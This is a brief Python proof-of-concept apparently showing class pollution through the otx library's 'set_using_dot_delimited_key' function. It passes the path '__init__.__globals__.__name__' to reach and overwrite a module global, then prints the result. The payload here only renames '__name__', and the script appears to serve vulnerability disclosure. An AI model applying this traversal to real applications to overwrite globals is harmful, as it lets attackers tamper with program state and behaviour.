from otx.engine.hpo.hpo_trial import set_using_dot_delimited_key

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

try:
    set_using_dot_delimited_key("__init__.__globals__.__name__", "polluted", obj)
except:
    pass

print(__name__)